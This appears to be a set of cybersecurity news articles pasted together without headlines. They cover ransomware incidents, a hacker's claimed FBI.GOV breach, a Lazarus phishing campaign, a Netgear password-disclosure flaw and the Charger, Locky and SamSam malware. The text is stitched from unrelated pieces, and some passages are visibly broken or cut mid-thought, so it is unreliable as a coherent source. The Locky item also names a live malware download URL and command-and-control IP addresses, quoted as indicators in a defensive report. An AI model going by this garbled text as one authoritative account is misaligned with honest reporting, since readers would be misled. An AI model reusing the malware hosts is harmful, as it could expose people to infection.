
The Town of Midland’s computer systems were hacked over the long weekend.
In the early morning hours of Sept 1, the town became the victim of a cyberattack in which the town’s network was illegally accessed and infected with ransomware.
The malware was able to encrypt a number of town systems rendering them unusable. The town has received a ransom demand to decrypt them.
Town staff worked quickly to isolate the attacked and activate a cyber incident investigation. According to town staff, the necessary steps are being taken to restore access to the system and files and to try and return operations to normal as quickly as possible.
“Residents can rest assured that we are taking this matter extremely seriously,” said Mayor Gord McKay. “We are working closely with cybersecurity experts that specialize in these types of illegal attacks, and we have reported the incident to law enforcement and the Information and Privacy Commissioner of Ontario.”
Vital services, such as fire and water and wastewater management, were not impacted as these systems are purposely isolated for security reasons.
Ongoing investigations have not found any evidence that information was removed from the system or inappropriately accessed and cybersecurity experts are working quickly to rule out that possibility.
In late April, Wasaga Beach had their computer systems hacked and locked down for several weeks. The town eventually paid the hackers three Bitcoins, worth approximately $34,000. However, other costs including loss of productivity, new hardware and consultant fees were estimated at a combined $250,000.
Based on the recommendations outlined a recent service delivery review and lessons learned from the cyberattack in Wasaga Beach, Midland had secured an insurance policy for protection in the event of such illegal activities. A strategy to address cybersecurity threats had been developed, which the town was in the process of implementing.
“At the time of the attack the town was in the process of making several improvements to our IT security,” said Midland chief administrative officer John Skorobohacz. “Once systems are fully restored, we will continue with those plans and look for additional opportunities to enhance our security based on the guidance of cybersecurity experts.”

The hacker leaked the FBI.GOV accounts that he found in several backup files (acc_102016.bck, acc_112016.bck, old_acc16.bck, etc).
Leaked records contain accounts data, including names, SHA1 Encrypted Passwords, SHA1 salts, and emails.
The intrusion occurred on December 22, 2016, the hacker revealed to have exploited a zero-day vulnerability in the Plone Content Management System
 Going back to 22nd December 2016, I tweeted about a 0day vulnerability in Plone CMS which is considered as the most secure CMS till date.
The vulnerability resides in some python modules of the CMS.
The hacker noticed that while media from Germany and Russia published the news about the hack, but US based publishers ignored it.
According to CyberZeist, the FBI contacted him to pass on the leaks.
""I was contacted by various sources to pass on the leaks to them that I obtained after hacking FBI.GOV but I denied all of them.
just because I was waiting for FBI to
react on time.
They didn’t directly react and I don’t know yet what are they up to, but at the time I was extracting my finds after hacking FBI.GOV,"" he wrote.
The expert added further info on the attack, while experts at the FBI were working to fix the issue, he noticed that the Plone 0day exploit was still working against the CMS backend.),  but I was able to recon that they were running FreeBSD ver 6.2-RELEASE that dates back to 2007 with their own custom configurations.
Their last reboot time was 15th December 2016 at 6:32 PM in the evening .
""While exploiting FBI.GOV, it was clearly evident that their webmaster had a very lazy attitude as he/she had kept the backup files (.bck extension) on that same folder
where the site root was placed (Thank you Webmaster!),  but still I didn’t leak out the whole contents of the backup files, instead I tweeted out my findings and thought to wait for FBI’s response""
Now let’s sit and wait for the FBI’s response. I obviously cannot publish the 0day attack vector myself. 
The hacker confirmed that the 0-day is offered for sale on Tor by a hacker that goes by the moniker “lo4fer”.
Once this 0day is no longer being sold, I will tweet out the Plone CMS 0day attack vector myself.
Let’s close with a curiosity … CyberZeist is asking you to chose the next target.
The hacker is very popular, among his victims, there are Barclays, Tesco Bank and the MI5.

International war monitor the Organization for Security and Co-operation in Europe (OSCE) last week revealed it has been on the receiving end of a “major” cyber-attack.
The 57-member state body – which also monitors elections, and plays a role in arms control and cybersecurity – told AFP that it first became aware of a “major information security incident” back in early November.
The attack apparently “compromised the confidentiality"" of its IT network and put its “integrity at risk”.
Although there’s no obvious official statement up on the OSCE site, spokeswoman Mersiha Causevic Podzic told the newswire that “the way in which the attacker accessed the OSCE was identified, as have some of the external communication destinations”.
There are rumors, emanating from a Western intelligence agency, that the notorious Russian hacking group APT28 is behind the attack.
There would certainly seem to be speculative evidence for this assumption, given that OSCE currently has 700 monitors overseeing the conflict with Russia in eastern Ukraine.
The conflict has been at the center of numerous cyber espionage campaigns tracked back to the Kremlin, most recently one aimed at tracking Ukrainian troop movements via the RAT Sofacy (X-Agent).
That particular campaign was also tied back to APT28 (aka Fancy Bear/Sofacy/Pawn Storm).
More infamously, the group has been linked to a hacking campaign against Democratic Party members which resulted in the publication of private emails designed to destabilize the Hillary Clinton presidential campaign and undermine the US democratic process.
Last week, President Obama decided to expel 35 suspected Russian spies and place sanctions on the GRU, which is thought to be linked to APT28, as well as another Russian intelligence service: the FSB.
However, France's ambassador to the OSCE, Veronique Roger-Lacan, tried to play down the seriousness of the attack.
“Diplomats at the OSCE are warned that attempted spying, in whatever form, are part and parcel of this organization,” she told AFP.

Bitcoin-seeking hackers are using old-school tricks to socially engineer would-be cryptocurrency exchange executives, researchers warn.
An attack group tied to North Korea has ""launched a malicious spear-phishing campaign using the lure of a job opening for the CFO role at a European-based cryptocurrency company,"" researchers at Secureworks Counter Threat Unit warn in a report.
The CTU researchers refer to the group behind the attack as ""Nickel Academy,"" although it is perhaps better known as the Lazarus Group (see Kaspersky Links North Korean IP Address to Lazarus ).
The group has been tied to numerous attacks, including the attempted theft of nearly $1 billion from the central bank of Bangladesh's New York Federal Reserve account, leading to $81 million being stolen; the WannaCry ransomware outbreak in May; as well as the use of cryptocurrency mining malware named Adylkuzz to attack the same flaw in Windows server block messaging that WannaCry also targeted (see Cybercriminals Go Cryptocurrency Crazy: 9 Factors).

Security researchers say Lazarus has also been running a series of job lure phishing attacks since at least 2016, with the latest round being delivered around Oct. 25 of this year. The malicious code has ""solid technical linkages"" to attacks previously attributed to Lazarus, CTU says (see Report: North Korea Seeks Bitcoins to Bypass Sanctions).
Researchers at Israeli cybersecurity startup Intezer also believe the code has been reused by Lazarus, based on a review of attack code that's been seen in the wild since 2014.
The fake job advertisement pretends to be for Luno, a bitcoin wallet software and cryptocurrency exchange based in London, according to an analysis of the phishing messages published Tuesday by Jay Rosenberg, a senior security researcher at Intezer.
Luno says it's been alerted to the fake emails bearing its name. ""We're aware of this issue and are investigating thoroughly,"" Luno tells ISMG.
If recipients of the latest CFO job lure phishing emails open an attached Microsoft Word document, it triggers a pop-up message inviting them to enable editing functions. The CTU researchers say this is an attempt to enable macros in Word, so that a malicious macro hidden inside the document can execute. If it does, the macro creates a decoy document - the fake CFO job lure - as well as installs a first-stage remote access Trojan RAT in the background. Once the RAT is running on the victim's PC, attackers can use it to install additional malware onto the system, such as keystroke loggers and password stealers (see Hello! Can You Please Enable Macros?).
The CTU researchers say the job listing appears to have been stolen from a legitimate CFO job listing posted to LinkedIn by a cryptocurrency firm in Asia. While the researchers say that Lazarus has done this previously, unusually in this case, some typographical errors in the original listing were expunged. The researchers add that this phishing campaign does not appear to target any specific firm or individual, but rather to be more broadly aimed.
""There are common elements in the macro and in the first-stage RAT used in this campaign with former campaigns,"" the researchers write. The custom command-and-control network code that controls infected endpoints also includes components that were seen in previous attacks tied to Lazarus, they add.

Financial institutions worldwide including those in the country have been implored to be extremely cautious of the growing cyber-attacks that put them at great risk this year than before.
The report further cautions that a slight mistake could cause great cash loss to the financial institutions like what happened to a Bangladesh Bank Central Bank.
The Sophos report indicates that financial infrastructure is at greater risk of attack.
""The use of targeted phishing and 'whaling' continues to grow.
These attacks use detailed information about company executives to trick employees into paying fraudsters or compromising accounts.
""We also expect more attacks on critical financial infrastructure, such as the attack involving SWIFTconnected institutions which cost the Bangladesh Central Bank $81 million in February,"" reveals the report.
The caution comes in following a Cybersecurity giant Sophos report published recently shows that the attacks are expected to increase this year.
Expounding further, the report indi - cates that the year 2016 saw a huge number and variety of cyber-attacks, ranging from a high-profile DDoS using hijacked Internet-facing security cameras to the alleged hacking of party officials during the US election, according to a report by a Cybersecurity giant Sophos.
The Sophos report shows that they also saw a rising tide of data breaches from big organisations and small and significant losses of people's personal information.
""Since the year 2016 is over, we're pondering how some of those trends might play out in 2017,"" it notes.
The report indicates that the current and emerging attack trends include the destructive DDoS IOT attack which is expected to rise.
""In 2016, Mirai showed the massive destructive potential of DDoS attacks as a result of insecure consumer IoT (Internet of Things) devices.
Mirai's attacks exploited only a small number of devices and vulnerabilities and used basic password guessing techniques,"" part of the report indicates.
However, the report claims that cybercriminals will find it easy to extend their reach because there are so many IoT devices containing outdated code based on poorly-maintained operating systems and applications with well-known vulnerabilities.
""Expect IoT exploits, better password guessing and more compromised IoT devices being used for DDoS or perhaps to target other devices in your network,"" it notes.
It shows there is a shift from exploitation to targeted social attacks.
""Cybercriminals are getting better at exploiting the ultimate vulnerability - humans.
Ever more sophisticated and convincing targeted attacks seek to coax users into compromising themselves.
For example, it's common to see an email that addresses the recipient by name and claims they have an outstanding debt the sender has been authorised to collect,"" explains part of the report.
It further states that shock, awe or borrowing authority by pretending to be law enforcement are common and effective tactics, saying that the email directs them to a malicious link that users are panicked into clicking on, opening them up to attack.
""Such phishing attacks can no longer be recognised by obvious mistakes,"" it states.
SWIFT recently admitted that there have been other such attacks and it expects to see more, stating in a leaked letter to client banks, stating that the threat is very persistent, adaptive and sophisticated - and it is here to stay.
The Sophos report notes that there is increasing exploitation of the Internet's inherently insecure infrastructure.
All Internet users rely on ancient foundational protocols and their ubiquity makes them nearly impossible to revamp or replace.

Media Prima Berhad's computer systems have been locked out by cyber attackers who are demanding millions of ringgit in ransom.
The media company, which runs a stable of TV and radio channels, newspapers, advertising and digital media companies was hit by a ransomware attack last Thursday (Nov 8), The Edge Financial Daily reported.
Ransomware is a type of malicious software (malware) designed to block access to a computer system until a sum of money is paid.
The report, quoting a source, said the attackers are demanding 1,000 bitcoins to release access to the computer systems.
This means that the attackers are demanding a ransom of RM26.42 million (S$8.71 million).
Media Prima is listed on Bursa Malaysia's main board.
It operates, among others, three national newspapers, namely New Straits Times, Berita Harian and Harian Metro; free-to-air television stations, namely TV3, TV9, ntv7 and 8TV; and four radio stations, namely Fly FM, Hot FM, One FM and Kool FM.
When contacted, Media Prima group managing director, Datuk Kamal Khalid, declined to comment when asked to confirm whether the company has been hit by ransomware.
He urged The Star to get in touch with the company's corporate communications department for comments, and efforts are ongoing to contact the department.
The Edge Financial Daily report said it was not immediately known whether Media Prima's data has been breached, and whether the media group would be suffering financial losses due to the ransomware attack.
It quoted another source saying that Media Prima's office e-mail has been affected but that the company has migrated the email to another system.
The source reportedly added that Media Prima has decided not to pay the ransom.

Back in January 2013, researchers from application security services firm DefenseCode unearthed a remote root access vulnerability in the default installation of some Cisco Linksys (now Belkin) routers.
The flaw was actually found in Broadcom’s UPnP implementation used in popular routers, and ultimately the researchers extended the list of vulnerable routers to encompass devices manufactured by the likes of ASUS, D-Link, Zyxel, US Robotics, TP-Link, Netgear, and others.
“Back in the days, Cisco fixed the vulnerability, but we are not sure about all other router vendors and models because there are too many of them,” the DefenseCode team noted. 
When DefenseCode first came out with the vulnerability in 2013, Rapid7 researchers also found a number of flaws in other popular UPnP implementations, and by scanning the Internet, revealed that there were approximately 15 million devices with a vulnerable Broadcom UPnP implementation.
It’s difficult to tell how many of these devices are still vulnerable but, as DefenseCode’s Leon Juranic pointed out to me, users rarely (if ever) update their router’s firmware, so there are bound to be still many of them.
And given how many people have watched and analyzed their technical video of the exploit in action over the years, obviously many are interested in it.
Still, I think we can all agree, four years is more than enough time for patching, and nobody can fault them for publishing the exploit. Hopefully, if there are manufacturers that still haven’t pushed out a patch they’ll do it now, but this is could also be a welcome impetus for users to update their router’s firmware – especially those that haven’t done it for years.

An Indiana hospital paid a ransom of $55,000 to get rid of ransomware that had infected its systems and was hindering operations last week.
The infection took root last week, on Thursday, January 11, when attackers breached the network of Hancock Health, a regional hospital in the city of Greenfield, Indiana.
Attackers deployed the SamSam ransomware, which encrypted files and renamed them with the phrase ""I’m sorry"", according to a local newspaper who broke the news last week.
Hospital operations were affected right away. IT staff intervened and took down the entire network, asking employees to shut down all computers to avoid the ransomware from spreading to other PCs.
By Friday, the next day, the hospital was littered with posters asking employees to shut down any computer until the incident was resolved.
While some news sites reported that the hospital shut down operations, medical and management staff continued their work, but with pen and paper instead of computers. Patients continued to receive care at the hospital's premise.
Hospital had backups but decides to pay ransom demand.
The hospital said that despite having backups it opted to pay the ransom demand of 4 Bitcoin, which was worth around $55,000 at the time the hospital paid the sum, on Saturday morning.
Hospital management told local press that restoring from backups was not a solution as it would have taken days and maybe even weeks to have all systems up and running. Hence, they decided paying the ransom was quicker.
By Monday, all systems were up and running, and the hospital released a short statement on its site admitting to the incident, but with very few other details.
While the hospital has not confirmed the typical SamSam attack scenario, they did say the infection was not the case of an employee opening a malware-infected email.
The FBI has long asked companies and individuals affected by ransomware to report any infections via the IC3 portal so the Bureau can get a better grasp of the threat and have the legal reasons to go after such groups.

Ransomware is costing UK companies a whopping £346 million every year, despite Britain being labelled ‘the most resolute’ country for dealing with the cyber attacks.
In fact, more than 40 per cent of mid-large UK business suffered on average five ransomware attacks during the last year, according to research by Vanson Bourne.
However, 92 per cent of security professionals feel confident in their ability to combat ransomware in the future. And there was more good news for British. The survey found the UK to be the most resolute, both in refusing to pay ransom demands, as well as the most effective in combatting them. They experience the fewest number of attacks: 40 per cent, versus 70 per cent in Germany, 59 per cent in France and 55 per cent in the USA and enjoy a 43 per cent success rate in successfully defending against attacks. 
The research, commissioned by SentinelOne, reveals that ransomware is costing individual businesses around the globe an average of £591,238 per annum. The research all concluded that the number of companies ravaged by ransomware is on the rise. Results show that the overall percentage of companies experiencing ransomware has increased from 48 per cent in 2016 to 56 per cent in 2018, however the average number per year has fallen from six to five attacks. The amount of time spent decrypting ransomware attacks has also increased from 33 to 40 man-hours. The study also reveals that employees are considered the major culprits responsible for introducing the malware into the business. This was further supported by the fact that phishing, which seeks to socially engineer employees, was the top attack vector by which ransomware infiltrated the business in 69 per cent of instances. 
Migo Kedem, director of Product Management at SentinelOne said: “It’s staggering to see the cost to British businesses of £346 million. This figure shows that businesses are becoming increasingly aware that it’s not just the ransom demand, but rather the ancillary costs of downtime, staff time, lost business, as well as the data recovery costs and reputational damage that are the biggest concern to British businesses.”
He added: “On a more positive note, it’s good to see CISOs feeling more bullish about their ability to tackle ransomware using the latest behavioural AI-based end-point technology. It’s also encouraging to see a clear movement against companies caving in to ransomware demands, preferring instead to take more proactive measure such as back-ups and patching of vulnerable systems. However, the volume of ransomware attacks is still increasing and their speed, scale, sophistication and success in evading detection with the growth in file-less and memory-based malware, explains why ransomware will continue to be a major threat to CISOs in 2018 and beyond.”

Home routers are the first and sometimes last line of defense for a network.
Despite this fact, many manufacturers of home routers fail to properly audit their devices for security issues before releasing them to the market.
As security researchers, we are often disappointed to rediscover that this is not always the case, and that sometimes these vulnerabilities simply fall into our hands during our day-to-day lives.
Such is the story of the two NETGEAR vulnerabilities I want to share with you today:
It was a cold and rainy winter night, almost a year ago, when my lovely NETGEAR VEGN2610 modem/router lost connection to the Internet.
I was tucked in bed, cozy and warm, there was no way I was going downstairs to reset the modem, ""I will just reboot it through the web panel"" I thought to myself.
Unfortunately I couldn't remember the password and it was too late at night to check whether my roommates had it.
I considered my options:
Needless to say, I chose the latter.
I thought to myself, ""Well, it has a web interface and I need to bypass the authentication somehow, so the web server is a good start.""
I started manually fuzzing the web server with different parameters, I tried ""../.."" classic directory traversal and such, and after about 1 minute of fuzzing, I tried ""…"" and I got this response:
Fig 1: unauth.cgi
""Hmm, what is that unauth.cgi thingy?
Luckily for me the Internet connection had come back on its own, but I was now a man on a mission, so I started to look around to see if there were any known vulnerabilities for my VEGN2610.
I started looking up what that ""unauth.cgi"" page could be, and I found 2 publicly disclosed exploits from 2014, for different models that manage to do unauthenticated password disclosure.
Those two guys found out that the number we get from unauth.cgi can be used with passwordrecovered.cgi to retrieve the credentials.
I tested the method described in both, and voila - I have my password, now I can go to sleep happy and satisfied.
I woke up the next morning excited by the discovery, I thought to myself: ""3 routers with same issue… Coincidence?
Luckily, I had another, older NETGEAR router laying around; I tested it and bam!
I started asking people I knew if they have NETGEAR equipment so I could test further to see the scope of the issue.
In order to make life easier for non-technical people I wrote a python script called netgore, similar to wnroast, to test for this issue.
I am aware of that and that is why I don't work as a full time programmer.
As it turned out, I had an error in my code where it didn't correctly take the number from unauth.cgi and passed gibberish to passwordrecovered.cgi instead, but somehow it still managed to get the credentials!
After few trials and errors trying to reproduce the issue, I found that the very first call to passwordrecovered.cgi will give out the credentials no matter what the parameter you send.
This is totally new bug that I haven't seen anywhere else.
When I tested both bugs on different NETGEAR models, I found that my second bug works on a much wider range of models.
A full description of both of these findings as well as the python script used for testing can be found here.
The vulnerabilities have been assigned CVE-2017-5521 and TWSL2017-003.
The Responsible Disclosure Process
This is where the story of discovery ends and the story of disclosure begins.
Following our Responsible Disclosure policy we sent both findings to NETGEAR in the beginning of April 2016.
In our initial contact, the first advisory had 18 models listed as vulnerable, although six of them didn't have the vulnerability in the latest firmware.
Perhaps it was fixed as part of a different patch cycle.
The second advisory included 25 models, all of which were vulnerable in their latest firmware version.
In June NETGEAR published a notice that provided a fix for a small subset of vulnerable routers and a workaround for the rest.
They also made the commitment to working toward 100% coverage for all affected routers.
The notice has been updated several time since then and currently contains 31 vulnerable models, 18 of which are patched now, and 2 models that they previously listed as vulnerable, but are now listed as not vulnerable.
In fact, our tests show that one of the models listed as not vulnerable (DGN2200v4) is, in fact, vulnerable and this can easily be reproduced with the POC provided in our advisory.
Over the past nine months we attempted to contact NETGEAR multiple times for clarification and to allow them time to patch more models.
Over that time we have found more vulnerable models that were not listed in the initial notice, although they were added later.
We also discovered that the Lenovo R3220 router is powered by NETGEAR firmware and it was vulnerable as well.
Luckily NETGEAR did eventually get back to us right before we were set to disclose these vulnerabilities publicly.
We were a little skeptical since our experience to date matched that of other third-party vulnerability researchers that have tried to responsibly disclose to NETGEAR only to be met with frustration.
The first was that NETGEAR committed to pushing out firmware to the currently unpatched models on an aggressive timeline.
The second change made us more confident that NETGEAR was not just serious about patching these vulnerabilities, but serious about changing how they handle third-party disclosure in general.
We fully expect this move will not only smooth the relationship between third-party researchers and NETGEAR, but, in the end, will result in a more secure line of products and services.
For starters, it affects a large number of models.
We have found more than ten thousand vulnerable devices that are remotely accessible.
The real number of affected devices is probably in the hundreds of thousands, if not over a million.
The vulnerability can be used by a remote attacker if remote administration is set to be Internet facing.

Check Point’s mobile security researchers have discovered a new ransomware in Google Play, dubbed Charger.
Charger was found embedded in an app called EnergyRescue.
The infected app steals contacts and SMS messages from the user’s device and asks for admin permissions.
If granted, the ransomware locks the device and displays a message demanding payment.
Researchers detected and quarantined the Android device of an unsuspecting customer employee who had unknowingly downloaded and installed Charger.
The early detection enabled them to quickly disclose the findings to Android’s Security team that added the malware to Android’s built-in protection mechanisms before it began to spread, ensuring only a handful of devices were infected.
Unlike most malware found on Google Play, that contains a dropper that later downloads the real malicious components to the device, Charger uses a heavy packing approach.
This makes it harder for the malware to stay hidden.
Charger’s developers compensated for this using a variety of techniques to boost its evasion capabilities so it could stay hidden on Google Play for as long as possible.
These included:
The ransom demand is for 0.2 Bitcoins or roughly $180 and is much higher than what has been seen in previous mobile ransomware attacks.
By comparison, the DataLust ransomware demanded merely $15 and could be an indicator of a wider effort by mobile malware developers to catch up with their PC ransomware cousins.
Similar to other malware seen in the past, Charger checks the local settings of the device and does not run its malicious logic if the device is located in Ukraine, Russia, or Belarus.
This is likely done to keep the developers from being prosecuted in their own countries or being extradited between countries.

After almost an almost non-existent presence in 2017 and a few weeks off, according to Malwarebytes security researcher S!Ri, Locky is back with a fresh wave of SPAM emails containing malicious docs. While it is not known what caused Locky's hiatus, if they plan on pushing the ransomware like they previously did, then we all need to pay close attention.
This current wave of SPAM comes in the form of emails that pretend to be payment receipts with various subjects. According to an article by My Online Security, the email subjects include Receipt 435, Payment Receipt 2724, Payment-2677, Payment Receipt_739, and Payment#229, where the numbers change.
These emails include a PDF attachment with a name like P72732.pdf. When these PDFs are opened, the target will be prompted to open an embedded Word document as shown below.
If a user opens the file, the Word document will open and the target will be greeted with the typical Malicious word document prompt. That is the prompting to enable the macros by clicking on Enable Content in order to properly see the document.
When the macros are enabled, the macros are currently downloading an encrypted Locky binary from http://uwdesign.com.br/9yg65, decrypting the file, saving it to %Temp%\redchip2.exe, and then executing the file to begin the encryption process. Redchip2.exe currently has a 7/55 detection on VirusTotal.
Just like previous variants, Locky deletes Shadow Volume Copies using a Scheduled Task and appends the .OSIRIS extension to encrypted files. 
While encrypting files it will routinely send status updates to the Command & Control servers located at 188.120.239.230/checkupdate and 80.85.158.212/checkupdate. When done it will display the ransom note to let the victim know that they have been infected.
Unfortunately, at this time there is still no way to decrypt files encrypted by Locky.
One of my client is infected by the original locky which the file extension name is .locky in March, 2017. That means locky never disappears.
Are you sure it is the real Locky? Lots of spoofs, honestly have not seen the original extension distributed in a super long time. ID Ransomware can detect between the real and the fakes.
True, it was the spam campaign that stopped. Some old locky files are still hosted on hacked server.

The ransomware was dubbed Charger and was hidden inside an app called EnergyRescue, according to a blog post published by security firm Check Point Software.

A breach of the Clash of Clans creator has exposed credentials for forum users.
Supercell, the force behind that popular mobile game and others, said that a vulnerability in the software it uses to run its forums allowed third-party hackers to gain illegal access to some forum user information, including a number of emails and encrypted passwords.
To provide its forum service, it uses software from vbulletin.com. The company said that its preliminary investigation suggests that the breach happened in September 2016—and that it has since been fixed.
“We take any such breaches very seriously and we follow very strict policies when it comes to security,” Supercell said in a statement. “Please note that this breach only affects our Forum service. Game accounts have not been affected.”
Avast Threat Labs senior malware analyst Jan Sirmer commented via email on the danger of attacks like these.
“The forum administrators in this case do bear some responsibility—the vBulletin software being used to host the Supercell forum was out-of-date, and it’s up to the administrators to keep software like that up-to-date,” he said. “Online gamers are vulnerable to these kind of hacks because they provide their data to third parties—but the same is true for everyone who uses any online service.”
Users should change the password they’re using on the forum as soon as possible, along with the password in any other systems they’re using with the same login.
“The information the hackers obtained can either be used by the hackers themselves or sold on the darknet for other hackers to abuse,” Sirmir said. “As many people use the same login credentials to log in to online services, hackers try to use login credentials they get to gain access into other accounts.”

Hundreds of thousands–potentially more than one million–Netgear routers are susceptible to a pair of vulnerabilities that can lead to password disclosure.
Researchers said that while anyone who has physical access to a router can exploit the vulnerabilities locally, the real threat is that the flaw can also be exploited remotely.
According to Simon Kenin, a security researcher with Trustwave’s Spiderlabs team, who discovered the flaw and disclosed it Monday, the vulnerabilities can be remotely exploited if the router’s remote management option is enabled.
While Netgear claims remote management is turned off on routers by default, Kenin said there are “hundreds of thousands, if not over a million” devices left remotely accessible.
Kenin claims that all he had to do was send a simple request to the router’s web management server to retrieve a router’s password.
After determining a number that corresponds to a password recovery token, he found he could pair it with a call to the router’s passwordrecovered.cgi script.
Kenin claims he made his discovery by leveraging two exploits disclosed in 2014 on some Netgear routers he had hanging around.
It wasn’t until after Kenin pieced together a python script designed to diagnose the scope of the issue that he determined he could still retrieve the router’s credentials even if he didn’t send the correct password recovery token.
“After few trials and errors trying to reproduce the issue, I found that the very first call to passwordrecovered.cgi will give out the credentials no matter what the parameter you send.
This is totally new bug that I haven’t seen anywhere else.
When I tested both bugs on different NETGEAR models, I found that my second bug works on a much wider range of models,” Kenin wrote Monday.
Kenin’s employer, Trustwave, divulged details around both vulnerabilities in a lengthy blog post Monday, putting the wraps on a nearly year-long odyssey with the vendor.
The firm first disclosed the vulnerability to Netgear in April 2016, initially it listing 18 vulnerable models, before listing 25 vulnerable models in a subsequent advisory.
After repeated requests for an update on a fix for the vulnerability, Netgear finally obliged in July and provided firmware updates for a fraction of the affected routers.
It wasn’t until this weekend that Netgear acknowledged the issues again, posting an updated version of the article on its support page, instructing users to find and download the appropriate firmware fixes.
The most recent version of the advisory claims there are 31 vulnerable models, 18 of which are patched.
The company is encouraging users of some devices in which firmware is not available to implement a workaround.
According to Netgear, users of 12 different models would be best served to manually enable password recovery and disable remote management on their devices.
“The potential for password exposure remains if you do not complete both steps.
NETGEAR is not responsible for any consequences that could have been avoided by following the recommendations in this notification,” the company writes.
It’s the first critical vulnerability to affect Netgear routers this year but the second in the last two months.
In December, it was discovered that a handful of the company’s Nighthawk line of routers were vulnerable to a flaw that could have given an attacker root access on the device and allowed them to run remote code.
The company was quick to release beta firmware updates to address the vulnerability but simultaneously confirmed that more routers than originally reported were vulnerable.
When reached Wednesday, a Netgear spokesperson said it was aware of the vulnerability and that it was appreciative of the research Trustwave carried out.
Trustwave discloses an unpatched vulnerability in Brother printers with the Debut embedded webserver after numerous attempts to contact the vendor failed.

	SamSam ransomware attacks are on the rise and operators are demanding more than ever from their victims, researchers have warned.
Ransomware, a kind of malware which locks infected systems, encrypts files and demands a payment in return for decryption, can be debilitating for businesses. Without access to core networks and systems, many firms and organizations will pay up rather than suffer through disruption which can be far more costly in the long run.
Consumers also face the same issue, albeit on a personal scale, and while security experts caution that paying up only funds this kind of cybercrime, losing access to your files, photos, and media can be devastating.
	When payment demands are a few hundred dollars or so, victims may be more inclined to pay the fee. However, the SamSam ransomware is now demanding far more than the average person would be able to raise.
Written in C#, SamSam is usually installed after an unpatched, known server vulnerability is exploited. It is believed the threat actors behind the ransomware are relatively new to extortion, having spent the last few years gradually scaling up their demands.
	The ransomware caught the attention of the FBI last year, resulting in two alerts being issued.
""MSIL or Samas (SAMSAM) was used to compromise the networks of multiple US victims, including 2016 attacks on healthcare facilities that were running outdated versions of the JBoss content management application,"" the FBI says. ""SAMSAM exploits vulnerable Java-based Web servers. SAMSAM uses open-source tools to identify and compile a list of hosts reporting to the victim's active directory."" 
""The actors then use psexec.exe to distribute the malware to each host on the network and encrypt most of the files on the system,"" the FBI added. ""The actors charge varying amounts in Bitcoin to provide the decryption keys to the victim.""
According to AlientVault researchers, the ransomware is more akin to a targeted attack than opportunistic ransomware. After being installed on one machine, the ransomware propagates and spreads to any others in the network. SamSam attacks can result in web shell deployment, batch script usage for running the malware over multiple machines, remote access, and tunneling.
The ransomware has recently been updated, and will now demand different payments depending on the scope of infection.
If one machine has been infected, 1.7 Bitcoin (BTC), roughly $4,600, is demanded. If more machines are locked by the ransomware, half will be decrypted for 6 BTC ($16,400), and for all of them, a total of 12 BTC, or $32,800, is demanded.
	Last week's attacks appear to have been successful, with $33,000 being paid to a Bitcoin wallet associated with SamSam.
While SamSam is not the most sophisticated kind of ransomware out there, the successful exploit of victims reminds us that this malware is out in the wild. Like so many other kinds of ransomware, however, keeping systems patched and up-to-date can prevent infection.
	An NYC hospital was forced to either pay $44,000 to SamSam operators or lose access to their systems after a successful infection. However, the organization refused to capitulate to the hacker's demands and instead endured a month of disruption before the hospital's systems were restored.
Another ransomware variant which has hit the headlines is WannaCry. After striking down hospitals and businesses across the globe, the Windows-based malware is yet to finish its rampage, with an estimated 300,000 victims worldwide.

Although Robert Herjavec, an investor on ABC's ""Shark Tank,"" expects the price of bitcoin to ""skyrocket,"" he has no plans to personally buy any.
That's because as the CEO of cybersecurity firm Herjavec Group, he doesn't want to support the growing trend of hackers using cryptocurrency.
""I can't invest in something that my enemy uses as funds,"" he explained on CNBC's ""Squawk Alley.""
Indeed, ""If there was no cryptocurrency, much of the large hacks that we're seeing today wouldn't exist,"" Herjavec told Money.
As one example, Herjavec is concerned with the role cryptocurrency plays in ransomware attacks.
""Cryptocurrency permits anonymity,"" he explains to CNBC Make It. ""It's a very popular form of payment for ransomware in particular.""
Ransomware is a type of software that locks or encrypts a computer user's data and files, in affect holding it hostage. To release the information, a hacker will demand a ransom payment.
Ransomware attacks increased 6,000 percent in 2016 from 2015, according to a study from IBM Security. And in 2017, 200,000 computers in 150 countries belonging to businesses, governments and even the U.K. National Health Service were impacted by the ransomware virus known as WannaCry. In that case, victims were told to make a payment in bitcoin to get their computers back.
Hackers often demand the ransom be paid in cryptocurrency because it allows them to remain anonymous, Herjavec says. ""I can take over your computer or personal information, hold it for ransom, give you instructions on how to create a virtual wallet, force you to pay me, and you have no way of finding out who I am,"" Herjavec explains.
That's because a bitcoin wallet is only identified by a number, and ""payments are direct without a bank or credit card company acting as the middle man,"" Herjavec says. ""There is no money trail, so it's very difficult to track back to an individual.""
With WannaCry, the hackers asked for $300 worth of bitcoin from victims, and if they waited over 72 hours to pay, the fine increased to $600. If they waited a week, their information would be locked for good. The Trump administration pointed to North Korea as the originator of the attack.
In 2016, ransomware was used to coerce Hollywood Presbyterian Medical Center, a hospital in Los Angeles, to pay 40 bitcoin to hackers, The New York Times reports. That sum was then worth $17,000. Bitcoin closed at $10,779.90 on Tuesday, March 6, according to CoinMarketCap, which makes those 40 coins worth about $431,196.
To protect yourself from ransomware attacks, take steps to secure your online information.
""Keep your computer and data safe by backing up often, using cloud services with dual factor authentication and complex passwords,"" Herjavec suggests. ""Have anti-virus [software] installed and kept up to date.""

Officials based at the City of Del Rio, in Texas, were forced to abandon electronic services and switch to pen and paper after a ransomware attack effectively closed down City Hall servers.
City representatives disclosed the cyberattack last week. The city was struck by the ransomware on Thursday, leading to all servers being disabled to prevent further spread.
Del Rio's Management Information Services (MIS) department then attempted to isolate the malware by turning off all Internet connections for other city departments.
In turn, this prevented any members of staff from logging into government systems.
As a result, employees of each department were forced to use pen and paper in their work and go back to manual entry for transactions taking place -- as and when they could considering there was no access to historical records -- while the ransomware was contained.
City officials have informed the FBI of the cyberattack and the Secret Service has now become involved in attempts to find out who is responsible.
It is not known at present who is behind the ransomware, what kind of malware is at fault, or whether or not any personal data has been compromised.
The Texan city has also not revealed how much the ransomware demanded in payment, as is usually the case with this particular form of malware. Ransoms are usually requested in return for a decryption key -- which may or may not work -- in order to unlock encrypted systems and restore access.
However, a Del Rio City Hall spokeswoman did reveal that the malware is somewhat unusual, as the ransom note posted to roughly 30 - 45 PCs contained a phone number to be used to pay the blackmail fee.
Most of the time, a note will be posted on a landing page containing instructions for paying ransom in cryptocurrency and victims will be given a wallet address, rather than a means to directly call the malware's operator.
""The City is diligently working on finding the best solution to resolve this situation and restore the system,"" an official statement reads. ""We ask the public to be patient with us as we may be slower in processing requests at this time.""

Millions of student, staff and faculty email addresses and passwords from 300 of the largest universities in the United States have been stolen and are being circulated by cyber criminals on the dark web, according to a recent report. 
